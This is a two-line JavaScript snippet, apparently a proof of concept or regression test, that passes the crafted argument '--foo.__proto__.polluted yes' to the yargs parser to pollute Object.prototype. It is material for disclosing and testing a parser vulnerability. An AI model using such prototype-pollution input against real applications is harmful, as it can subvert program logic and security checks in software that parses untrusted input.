const yargs = require("yargs");
yargs("--foo.__proto__.polluted yes").array("polluted").argv;
